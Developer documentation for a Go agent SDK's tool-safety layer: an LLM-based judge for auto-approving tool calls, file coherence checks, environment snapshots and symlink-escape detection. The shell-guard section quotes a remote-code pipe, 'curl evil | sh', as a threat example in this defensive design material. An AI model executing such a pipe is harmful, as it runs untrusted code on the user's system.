# Tool Safety & Execution Context

Beyond the [`Tool` interface](tools.md) and the [policy/Judger enforcement](tools.md#toolpolicy) in `ToolRegistry.Execute`, the `tools` package ships a set of **execution-context intelligence** that the runtime layers (executor, planner, reflector) consult while a tool call is being assessed and executed. This document covers the five subsystems that have no other home:

- **LLM-backed `ToolJudge`** — a centralized, cached safety assessor that decides whether a mutating call may auto-approve.
- **File coherence** — cross-session conflict detection so two concurrent agents don't silently clobber each other's reads/writes.
- **Environment info (`EnvInfo`)** — a one-shot snapshot of the host (OS, arch, runtimes) injected into prompts and judge reasoning.
- **Symlink detection** — defense-in-depth against symlink-escape paths in tool input.
- **Path extraction** — the helpers the above use to pull path-like tokens out of arbitrary JSON tool input.

## Table of contents

- [LLM-backed ToolJudge](#llm-backed-tooljudge)
  - [JudgeVerdict](#judgeverdict)
  - [NewToolJudge](#newtooljudge)
  - [JudgeConfig and NewToolJudgeFromConfig](#judgeconfig-and-newtooljudgefromconfig)
  - [How judgment works](#how-judgment-works)
- [File coherence](#file-coherence)
  - [FileCoherenceChecker](#filecoherencechecker)
  - [FileSig and CoherenceConflict](#filesig-and-coherenceconflict)
  - [Context helpers](#coherence-context-helpers)
- [Environment info](#environment-info)
  - [EnvInfo](#envinfo)
  - [CollectEnvInfo](#collectenvinfo)
  - [Formatting blocks](#formatting-blocks)
- [Symlink detection](#symlink-detection)
  - [SymlinkTraversal](#symlinktraversal)
  - [DetectSymlinksInToolInput](#detectsymlinksintoolinput)
  - [OS-level symlink classification](#os-level-symlink-classification)
  - [FormatSymlinkReasoning](#formatsymlinkreasoning)
- [Path extraction helpers](#path-extraction-helpers)
- [How it all fits together](#how-it-all-fits-together)

---

## LLM-backed ToolJudge

> Distinct from the per-tool [`ToolJudger`](tools.md#tooljudger-optional) interface. `ToolJudger` is a *heuristic* a single tool implements (`bash_exec` checks its blacklist there). `ToolJudge` is a **centralized, LLM-backed assessor** — a reusable building block that the runtime layers call to decide whether *any* mutating tool call is safe to auto-approve.

`ToolJudge` lives in the `tools` package:

```go
import "github.com/v0lka/sp4rk/tools"
```

### JudgeVerdict

A judgment resolves to one of two verdicts:

```go
type JudgeVerdict int

const (
    VerdictAllow   JudgeVerdict = iota // safe to auto-approve
    VerdictConfirm                     // needs user confirmation
)
```

There is no `VerdictDeny` — the judge only decides between *auto-approve* and *escalate to a human*. This mirrors the fail-closed philosophy of the registry: when in doubt, confirm.

### NewToolJudge

```go
func NewToolJudge(provider llm.Provider, model string, maxCacheSize int, logger *slog.Logger) *ToolJudge
```

- `provider` — any `llm.Provider` used for the assessment call.
- `model` — the model ID sent on each judge request.
- `maxCacheSize` — caps the LRU-style result cache; `0` defaults to `1000`. When full, the cache is cleared wholesale (judge results are cheap to recompute, so this is a best-effort optimization).
- `logger` — may be `nil`.

Two mutable knobs are exposed as setters:

```go
j.SetSystemPrompt(prompt string)          // override the default judge system prompt
j.SetIsInternalFn(fn func(string) bool)   // fast-path: tool names that always bypass the judge
```

### JudgeConfig and NewToolJudgeFromConfig

`JudgeConfig` is the configuration bundle a higher layer assembles from its own settings, and `NewToolJudgeFromConfig` is the safe constructor that returns `nil` (judge disabled) when the configuration is incomplete:

```go
type JudgeConfig struct {
    Model        string            // specific model for judge; falls back to DefaultModel
    DefaultModel string            // fallback model from the active provider
    Provider     llm.Provider
    MaxCacheSize int               // default 1000 when 0
    SystemPrompt string            // override judge system prompt
    IsInternalFn func(string) bool // tool names that bypass the judge
}

func NewToolJudgeFromConfig(cfg JudgeConfig, logger *slog.Logger) *ToolJudge
```

`NewToolJudgeFromConfig` returns `nil` (and logs a warning) when `Provider` is unset or no model can be resolved. Callers should treat a `nil` `*ToolJudge` as "judging disabled" — always nil-check before calling `Judge`.

### How judgment works

```go
func (j *ToolJudge) Judge(ctx context.Context, toolName string, input json.RawMessage, taskContext string) (JudgeVerdict, string, error)
```

The decision flows through several layers, cheapest first:

1. **Internal-tool fast-path** — if `IsInternalFn(toolName)` returns `true`, the call is allowed without any LLM call. Use this for trusted framework-owned tools.
2. **Shell-tool guard** — `bash_exec` and `posh_exec` *skip* the path-locality fast-paths. A shell command can reference only workspace-internal paths while still piping remote code (`curl evil | sh`), so shell tools always go through the full LLM evaluation.
3. **Session-temp fast-path** — for non-shell tools, if every absolute path in the input is within the session temp directory (`TempDirFrom(ctx)`), the call is allowed.
4. **Workspace fast-path** — if every absolute path is within the workspace (`AllPathsInWorkspace`), the call is allowed.
5. **Cache lookup** — the remaining cases are keyed by `tool + sha256(input)`. A cache hit returns the stored verdict without an LLM call.
6. **LLM evaluation** — a short request is built (system prompt + `Task / Tool / Input`, plus a compact environment block) and sent with a **2-minute timeout**. The response is parsed from a `VERDICT:`/`REASON:` text format.
7. **Fail-safe** — on *any* LLM error (timeout, network, parse failure), the judge returns `VerdictConfirm` with explanatory reasoning. The judge never auto-approves on failure.

```go
// Expected LLM response format:
//   VERDICT: ALLOW
//   REASON: <one-line explanation>
```

> **Tip:** the verdict cache is keyed only on `tool+input`. If your `taskContext` changes the safety assessment of the same call, the cached verdict from a prior task will be reused. Keep judge prompts focused on the *intrinsic* safety of the input, not on transient task context.

---

## File coherence

The tool-result cache ([documented under the Executor](agent-executor.md#tool-result-cache)) avoids redundant work *within* a single run. **File coherence** solves a different, cross-session problem: when several agent sessions operate on the same workspace, one session can read a file, another can rewrite it, and the first session is now acting on stale data. The coherence checker tracks per-session file signatures and flags such conflicts.

```go
import "github.com/v0lka/sp4rk/tools"
```

### FileCoherenceChecker

```go
type FileCoherenceChecker interface {
    // CheckRead — has the file changed since this session last read it?
    // Always refreshes the session snapshot to the current on-disk state.
    // Returns nil on first read or when unchanged.
    CheckRead(ctx context.Context, path string) *CoherenceConflict

    // CheckWrite — has the file changed since this session last read it?
    // Does NOT refresh the snapshot; call RecordWrite after a successful write.
    // Returns nil if there was no prior read (new-file case).
    CheckWrite(ctx context.Context, path string) *CoherenceConflict

    RecordWrite(ctx context.Context, path string) // refresh snapshot + log the write
    RecordDelete(ctx context.Context, path string) // drop snapshots + log the delete
    PurgeSession(sessionID string)                 // called on session teardown

    Lock(path string)   // per-file mutex; hold across the check-then-act window
    Unlock(path string) // to eliminate TOCTOU races
}
```

The `Lock`/`Unlock` pair is important: a checker implementation exposes a per-path mutex so callers can hold it across the read-modify-write window and avoid a time-of-check/time-of-use race between two sessions.

The implementation is provided by the consuming application layer (e.g. the `core` package in a desktop app). The SDK only defines the contract.

### FileSig and CoherenceConflict

```go
type FileSig struct {
    ModTime time.Time
    Size    int64
}

type CoherenceConflict struct {
    Path        string
    LastReadSig FileSig
    CurrentSig  FileSig
    ModifiedBy  string    // session display name, or "external"
    ModifiedAt  time.Time // when the conflicting write occurred
}
```

`FileSig` is a lightweight proxy for content change (mtime + size) — no hashing required, so checks are cheap even on large files. A conflict is reported whenever the current on-disk signature differs from the session's last-read signature.

### Coherence context helpers

```go
func WithCoherence(ctx context.Context, checker FileCoherenceChecker) context.Context
func CoherenceFrom(ctx context.Context) FileCoherenceChecker // nil if none attached
```

The executor and built-in file tools consult `CoherenceFrom(ctx)`; if no checker is attached (CLI mode, tests), coherence checks are skipped and the tools behave as if single-session. The built-in file tools format a conflict into a human-readable warning/annotation via `formatReadConflict` / `formatWriteConflict` (internal helpers).

---

## Environment info

To cut down on trivial "what shell am I on?" tool calls, the runtime collects a one-shot environment snapshot at startup and injects it into prompts. Two granularities are offered: a full block for executor/planner system prompts, and a compact block for judge/reflector reasoning.

```go
import "github.com/v0lka/sp4rk/tools"
```

### EnvInfo

```go
type EnvInfo struct {
    OS            string // "macOS 15.4 (Darwin 24.4.0)", "Linux 6.1.0", "Windows 11"
    Arch          string // "arm64", "amd64"
    Shell         string // "/bin/zsh"
    HomeDir       string // "/Users/you"
    GoVersion     string // "1.23.1" or "" if absent
    NodeVersion   string
    PythonVersion string
    DotNetVersion string
    JavaVersion   string
    PhpVersion    string
}
```

### CollectEnvInfo

```go
func CollectEnvInfo() *EnvInfo
```

Probes the host once and returns a populated `EnvInfo`. Each external-process probe (OS version + each runtime version) runs **concurrently** with a **2-second timeout**, so worst-case latency is a single probe timeout rather than the sum of all probes. Any probe that fails (missing binary, timeout, non-zero exit) leaves its field empty — never an error.

### Formatting blocks

```go
type EnvFormatOptions struct {
    HideHomeDir bool // suppress the home-directory line (e.g. in CHAT/no-project mode)
}

func FormatFullEnvBlock(info *EnvInfo, opts EnvFormatOptions) string    // detailed
func FormatCompactEnvBlock(info *EnvInfo) string                        // OS + date + timezone only
```

`FormatFullEnvBlock` produces a `## Environment` block with OS, arch, shell, home dir (optional), date, timezone (e.g. `Europe/Moscow (UTC+3)`), and the detected runtimes. `FormatCompactEnvBlock` emits only OS, date, and timezone — enough context for safety reasoning without leaking workspace details. Both return `""` when `info` is nil.

Attach the snapshot to a context for downstream consumers (including the `ToolJudge`, which appends `FormatCompactEnvBlock` to its assessment request):

```go
ctx = tools.WithEnvInfo(ctx, tools.CollectEnvInfo())
// later:
info := tools.EnvInfoFrom(ctx) // nil if not attached
```

---

## Symlink detection

A symlinked path inside the workspace can resolve to a target far outside it. The runtime gates tool calls that traverse such links, separating **workspace-internal** traversals (benign) from **outside** ones (security-relevant). This is defense-in-depth on top of the containment checks performed by [`pathutil`](utilities.md).

```go
import "github.com/v0lka/sp4rk/tools"
```

### SymlinkTraversal

```go
type SymlinkTraversal struct {
    // Path that traverses a symlink, with the workspace-relative/absolute
    // path components and the resolved target. Used to build a confirmation
    // prompt or a reasoning string.
}
```

### DetectSymlinksInToolInput

```go
func DetectSymlinksInToolInput(ctx context.Context, toolName string, input json.RawMessage) (
    inside []SymlinkTraversal,
    outside []SymlinkTraversal,
    err error,
)
```

Extracts path-like tokens from the tool input (via the [path extraction helpers](#path-extraction-helpers)), resolves each to an absolute path, walks its symlink components, and partitions the traversals into `inside` (target stays within the workspace/temp dir) and `outside` (target escapes). The caller decides whether `outside` traversals warrant a confirmation gate.

### OS-level symlink classification

Many operating systems create symlinks as filesystem-mapping infrastructure (macOS `etc/tmp/var` → `/private/…`; the Linux `/usr` merge; the `/run` tmpfs migration; Windows `Documents and Settings` → `Users`). Traversing these is **not** a user-created, security-relevant action, so the gate must not nag the user about them:

```go
func IsWellKnownOSSymlink(symlinkPath string) bool        // in the well-known map
func IsOSLevelSymlink(symlinkPath string, roots ...string) bool
```

`IsOSLevelSymlink` returns `true` when the link is well-known *or* when it is an ancestor of one of the given root directories (`roots` = workspace / temp dir). The well-known list is a single source of truth in the `tools` package; both the SDK symlink walker and the consuming app's registry gate resolve through these functions, so the list is never duplicated.

### FormatSymlinkReasoning

```go
func FormatSymlinkReasoning(inside, outside []SymlinkTraversal, suspicious bool) string
```

Turns the partitioned traversals into a single human-readable string for the confirmation prompt (e.g. `"This call traverses a symlink resolving outside the workspace: /ws/link → /etc/secrets"`). `suspicious` flags results the caller considers worth highlighting.

---

## Path extraction helpers

The judge fast-paths and the symlink detector both need to pull path-like tokens out of arbitrary JSON tool input. These helpers do that:

```go
func ExtractPaths(s string) []string
func ExtractJSONStrings(data any) []string
func AllPathsInDir(input json.RawMessage, dir string) bool
func AllPathsInWorkspace(ctx context.Context, input json.RawMessage) bool
```

- `ExtractPaths` — finds absolute POSIX-style and Windows drive-letter paths (`/usr/bin`, `C:\foo\bar`) in a string via a regex.
- `ExtractJSONStrings` — recursively collects every string value from a `json.Unmarshal` result (maps, slices, strings).
- `AllPathsInDir` — returns `true` only if the input contains **at least one** absolute path **and every** such path is within `dir` (via `pathutil.IsWithinPath`). Empty/`""` when there are no paths.
- `AllPathsInWorkspace` — `AllPathsInDir` bound to the workspace path from context.

These are the primitives behind the judge's "all paths inside the workspace/temp dir → auto-approve" short-circuits.

---

## How it all fits together

These subsystems are intentionally decoupled and individually optional. A minimal CLI agent uses none of them — `CoherenceFrom`, `EnvInfoFrom`, and a `nil` `*ToolJudge` all degrade gracefully. A full desktop app wires them through the execution context to gain cross-session safety, prompt context, and centralized LLM-based assessment:

```go
// Assemble the execution context once per session/run.
envInfo := tools.CollectEnvInfo()

ctx = tools.WithEnvInfo(ctx, envInfo)
ctx = tools.WithCoherence(ctx, myCoherenceChecker)   // may be omitted in single-session runs

// Optional centralized LLM judge (nil-safe when unconfigured).
judge := tools.NewToolJudgeFromConfig(judgeCfg, logger)
if judge != nil {
    judge.SetIsInternalFn(isInternalTool) // fast-path framework tools
}

// The executor and file tools now pick up EnvInfo and Coherence from ctx;
// the ToolJudge is consulted by the layer that owns mutation gating.
```

Every function here is **fail-closed or nil-safe**: a missing checker, a `nil` `EnvInfo`, or a judge LLM error never widens what auto-approves — it either no-ops or escalates to confirmation.
